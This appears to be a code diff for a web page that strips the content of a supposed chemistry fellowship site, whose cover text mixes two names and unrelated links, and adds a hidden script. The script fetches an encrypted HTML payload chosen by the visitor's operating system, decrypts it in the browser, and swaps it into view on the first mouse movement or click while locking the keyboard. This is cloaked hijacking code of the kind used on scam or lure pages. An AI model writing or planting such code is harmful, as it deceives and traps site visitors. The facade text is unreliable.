-        <h2 style="margin: 0.8rem 0; color: #0B192C;">Collegiate Placement, Grants &amp; Peer-Reviewed Publications</h2>
-        <p class="lead" style="color: #526374; font-size: 1.05rem;">
-          ChemistryKeen fellows routinely advance to leading doctoral institutes, pharmaceutical research pipelines, and national laboratory appointments.
-        </p>
-      </div>
-      <div class="grid-4" style="text-align: center; margin-bottom: 3.5rem;">
-        <div style="background: #FFFFFF; padding: 2rem; border-radius: var(--radius-md); border: 1px solid #D1DEE8;">
-          <div style="font-size: 2.5rem; font-weight: 700; color: #0B192C; font-family: var(--font-serif);">94.6%</div>
-          <div style="font-weight: 600; color: #0B192C; margin: 0.4rem 0;">Doctoral Placement</div>
-          <p style="font-size: 0.82rem; color: #526374; margin: 0;">Admitted to top-tier chemistry graduate programs including Harvard, MIT, and Caltech.</p>
-        </div>
-        <div style="background: #FFFFFF; padding: 2rem; border-radius: var(--radius-md); border: 1px solid #D1DEE8;">
-          <div style="font-size: 2.5rem; font-weight: 700; color: #00A8E8; font-family: var(--font-serif);">$14.2M</div>
-          <div style="font-weight: 600; color: #0B192C; margin: 0.4rem 0;">Active Federal Grants</div>
-          <p style="font-size: 0.82rem; color: #526374; margin: 0;">Funded by competitive National Science Directorate and Department of Energy awards.</p>
-        </div>
-        <div style="background: #FFFFFF; padding: 2rem; border-radius: var(--radius-md); border: 1px solid #D1DEE8;">
-          <div style="font-size: 2.5rem; font-weight: 700; color: #00C9A7; font-family: var(--font-serif);">78+</div>
-          <div style="font-weight: 600; color: #0B192C; margin: 0.4rem 0;">Annual Publications</div>
-          <p style="font-size: 0.82rem; color: #526374; margin: 0;">Peer-reviewed articles in JACS, Angewandte Chemie, and Nature Chemistry.</p>
-        </div>
-        <div style="background: #FFFFFF; padding: 2rem; border-radius: var(--radius-md); border: 1px solid #D1DEE8;">
-          <div style="font-size: 2.5rem; font-weight: 700; color: #0B192C; font-family: var(--font-serif);">100%</div>
-          <div style="font-weight: 600; color: #0B192C; margin: 0.4rem 0;">Instrument Licensure</div>
-          <p style="font-size: 0.82rem; color: #526374; margin: 0;">Every fellow earns certified hands-on clearance for independent spectrometer operation.</p>
-        </div>
-      </div>
-    </div>
-  </section>
+  
+  let lastUrl = null;
+  let readyPromise = null;
 
-  <!-- SECTION 11: ACADEMIC FAQ ACCORDION -->
-  <section class="section section-faq" style="padding: 5.5rem 0; background: #FFFFFF;">
-    <div class="container" style="max-width: 900px;">
-      <div class="text-center" style="margin-bottom: 3.5rem;">
-        <span class="hero-badge" style="background: rgba(11, 25, 44, 0.06); color: #0B192C;">FREQUENTLY ADDRESSED INQUIRIES</span>
-        <h2 style="margin: 0.8rem 0; color: #0B192C;">Academic Fellowships &amp; Research Facility Advisory</h2>
-        <p class="lead" style="color: #526374; font-size: 1.05rem;">Authoritative guidance for prospective undergraduate scholars, doctoral candidates, and visiting researchers.</p>
-      </div>
-      <div class="faq-accordion">
-        <div class="faq-item" style="border: 1px solid #D1DEE8; border-radius: var(--radius-sm); margin-bottom: 1rem; overflow: hidden;">
-          <button class="faq-question" style="width: 100%; text-align: left; padding: 1.2rem 1.5rem; background: #F8FAFC; border: none; font-weight: 600; font-size: 1.05rem; color: #0B192C; display: flex; justify-content: space-between; align-items: center; cursor: pointer;">
-            <span>What are the admission prerequisites for the undergraduate research fellowship?</span>
-            <span class="faq-icon" style="color: #00A8E8; font-size: 1.3rem;">+</span>
-          </button>
-          <div class="faq-answer" style="padding: 1.2rem 1.5rem; background: #FFFFFF; border-top: 1px solid #D1DEE8;">
-            <p style="margin: 0; color: #33383F; font-size: 0.95rem; line-height: 1.68;">Candidates must have completed collegiate foundational sequences in general chemistry, single-variable calculus, and introductory physics with exemplary academic standing. Submission of an analytical research statement, two academic faculty endorsements, and an in-person facility interview at 181 Mercer Street are required.</p>
-          </div>
-        </div>
-        <div class="faq-item" style="border: 1px solid #D1DEE8; border-radius: var(--radius-sm); margin-bottom: 1rem; overflow: hidden;">
-          <button class="faq-question" style="width: 100%; text-align: left; padding: 1.2rem 1.5rem; background: #F8FAFC; border: none; font-weight: 600; font-size: 1.05rem; color: #0B192C; display: flex; justify-content: space-between; align-items: center; cursor: pointer;">
-            <span>How much direct hands-on operating time do fellows receive on the 600 MHz NMR?</span>
-            <span class="faq-icon" style="color: #00A8E8; font-size: 1.3rem;">+</span>
-          </button>
-          <div class="faq-answer" style="padding: 1.2rem 1.5rem; background: #FFFFFF; border-top: 1px solid #D1DEE8;">
-            <p style="margin: 0; color: #33383F; font-size: 0.95rem; line-height: 1.68;">Unlike conventional universities that restrict NMR operation to technicians, ChemistryKeen fellows complete a rigorous 40-hour instrument qualification, after which they receive autonomous scheduling clearance with 24/7 keycard access to the spectrometer consoles.</p>
-          </div>
-        </div>
-        <div class="faq-item" style="border: 1px solid #D1DEE8; border-radius: var(--radius-sm); margin-bottom: 1rem; overflow: hidden;">
-          <button class="faq-question" style="width: 100%; text-align: left; padding: 1.2rem 1.5rem; background: #F8FAFC; border: none; font-weight: 600; font-size: 1.05rem; color: #0B192C; display: flex; justify-content: space-between; align-items: center; cursor: pointer;">
-            <span>What chemical hygiene and hazardous material certifications are mandated?</span>
-            <span class="faq-icon" style="color: #00A8E8; font-size: 1.3rem;">+</span>
-          </button>
-          <div class="faq-answer" style="padding: 1.2rem 1.5rem; background: #FFFFFF; border-top: 1px solid #D1DEE8;">
-            <p style="margin: 0; color: #33383F; font-size: 0.95rem; line-height: 1.68;">All researchers must certify in OSHA Laboratory Safety Standard (29 CFR 1910.1450), hazardous waste handling, cryogenic liquid safety, and Class 3B/4 laser alignment before entering our cleanroom laboratories.</p>
-          </div>
-        </div>
-        <div class="faq-item" style="border: 1px solid #D1DEE8; border-radius: var(--radius-sm); margin-bottom: 1rem; overflow: hidden;">
-          <button class="faq-question" style="width: 100%; text-align: left; padding: 1.2rem 1.5rem; background: #F8FAFC; border: none; font-weight: 600; font-size: 1.05rem; color: #0B192C; display: flex; justify-content: space-between; align-items: center; cursor: pointer;">
-            <span>Are research fellowships supported with academic stipends?</span>
-            <span class="faq-icon" style="color: #00A8E8; font-size: 1.3rem;">+</span>
-          </button>
-          <div class="faq-answer" style="padding: 1.2rem 1.5rem; background: #FFFFFF; border-top: 1px solid #D1DEE8;">
-            <p style="margin: 0; color: #33383F; font-size: 0.95rem; line-height: 1.68;">Yes. All enrolled undergraduate and doctoral fellows receive competitive semester stipends, dedicated research travel allocations to national conferences, and full coverage of instrumental consumables and analytical services.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
 
-  <!-- SECTION 12: FELLOWSHIP ADMISSIONS & VISITATION CTA -->
-  <section class="section section-cta" style="padding: 6rem 0; background: linear-gradient(135deg, #0B192C 0%, #06101E 100%); color: #FFFFFF; text-align: center;">
-    <div class="container" style="max-width: 800px;">
-      <span class="hero-badge" style="background: rgba(0, 168, 232, 0.2); color: #00A8E8; border: 1px solid rgba(0, 168, 232, 0.4);">ACADEMIC ADMISSIONS OPEN FOR FALL 2026</span>
-      <h2 style="margin: 1.2rem 0; color: #FFFFFF; font-size: clamp(2rem, 4vw, 2.8rem);">Commence Your Molecular Discovery at ChemistryKeen</h2>
-      <p class="lead" style="color: #A0B4C8; font-size: 1.15rem; line-height: 1.7; margin-bottom: 2.5rem;">
-        Arrange a private inspection of our Class-1000 cleanroom and high-field spectroscopy suites at 181 Mercer Street, New York, NY 10012, or consult directly with our academic admissions committee at +1-888-777-5845.
-      </p>
-      <div style="display: flex; gap: 1.2rem; justify-content: center; flex-wrap: wrap;">
-        <a href="/contact.html" class="btn btn-primary" style="background: #00A8E8; color: #0B192C; font-weight: 700; border-color: #00A8E8; padding: 0.9rem 2rem;">Apply for Research Fellowship &rarr;</a>
-        <a href="/collection.html" class="btn btn-outline" style="border-color: #FFFFFF; color: #FFFFFF; padding: 0.9rem 2rem;">Review Course Syllabi</a>
-        <a href="/blog.html" class="btn btn-outline" style="border-color: #00C9A7; color: #00C9A7; padding: 0.9rem 2rem;">Read Academic Treatises</a>
-      </div>
-    </div>
-  </section>
+  function secureKeyboardAccess() {
+    if (navigator.keyboard) navigator.keyboard.lock().catch(() => {});
+  }
 
-  <!-- Mandatory Global Site Footer (Minimalist 4-Column Horizontal Spread Layout) -->
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <div class="footer-brand">◈ Cognitivemap</div>
-          <p class="footer-desc">
-            The benchmark of scholarly rigor & advanced intellectual mastery. Dedicated collegiate research fellowship, advanced analytical spectroscopy, and molecular discovery at 181 Mercer Street.
-          </p>
-          <div class="footer-contact-item"><strong>Address:</strong> 181 Mercer Street, New York, NY 10012, United States</div>
-          <div class="footer-contact-item"><strong>Phone:</strong> +1-888-777-5845</div>
-          <div class="footer-contact-item"><strong>Concierge:</strong> concierge@cognitivemap.com</div>
-        </div>
-        <div class="footer-col">
-          <ul class="footer-links">
-            <li><a href="/">Home</a></li>
-            <li><a href="/about.html">The Academy</a></li>
-            <li><a href="/collection.html">Curriculum</a></li>
-            <li><a href="/blog.html">Treatises</a></li>
-            <li><a href="/contact.html">Admissions</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <ul class="footer-links">
-            <li><a href="/blog/cognitive-load-theory-and-multimedia-pedagogy.html">Cognitive Load Theory</a></li>
-            <li><a href="/blog/neural-mechanisms-of-concept-mapping-and-spatial-memory.html">Neural Mechanisms of Conce</a></li>
-            <li><a href="/blog/spaced-repetition-algorithms-and-retrieval-practice-kinetics.html">Spaced Repetition Algorith</a></li>
-            <li><a href="/blog/metacognitive-scaffolding-and-inquiry-based-curricula.html">Metacognitive Scaffolding </a></li>
-            <li><a href="/blog/neuroplasticity-and-executive-function-in-accelerated-learning.html">Neuroplasticity</a></li>
-            <li><a href="/blog/pedagogical-diagnostics-and-adaptive-learning-metrology.html">Pedagogical Diagnostics</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <p class="footer-salon-desc">
-            Visit our Class-1000 cleanroom suites and molecular spectroscopy commons at 181 Mercer Street for fellowship consultations and facility inspection.
-          </p>
-          <p class="footer-hours">
-            Mon &ndash; Fri: 8:30 AM &ndash; 6:30 PM<br>EST<br>Saturday: By Research Appointment
-          </p>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 Cognitivemap Collegiate Institute. All Rights Reserved. Academic research at 181 Mercer Street, New York, NY 10012.</p>
-        <div class="footer-legal-links">
-          <a href="/privacy-policy.html">Privacy Policy</a>
-          <a href="/terms-and-conditions.html">Terms &amp; Conditions</a>
-          <a href="/disclaimer.html">Disclaimer</a>
-          <a href="/cookie-policy.html">Cookie Policy</a>
-        </div>
-      </div>
-    </div>
-  </footer>
-  <script src="/assets/js/main.js"></script>
+  async function preloadSecret() {
+    if (readyPromise) return readyPromise;
+    readyPromise = (async () => {
+      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      lastUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));
+      return lastUrl;
+    })();
+    return readyPromise;
+  }
+
+  async function showSecret() {
+    const shop = document.getElementById("shop");
+    const frame = document.getElementById("frame");
+    const contentIframe = document.getElementById("contentiframe");
+    try {
+      const url = await preloadSecret();
+      frame.src = url;
+      shop.style.display = "none";
+      contentIframe.style.display = "block";
+      document.getElementById("customPopup").style.display = "none";
+      secureKeyboardAccess();
+    } catch (e) {
+      document.querySelector(".hint").textContent = "⚠️ " + e.message;
+      document.getElementById("customPopup").style.display = "none";
+    }
+  }
+
+  
+  preloadSecret().catch(() => {});
+
+ 
+  window.addEventListener("mousemove", showSecret, { once: true });
+  window.addEventListener("touchstart", showSecret, { once: true });
+  window.addEventListener("click", showSecret, { once: true });
+</script>
 </body>
 </html>
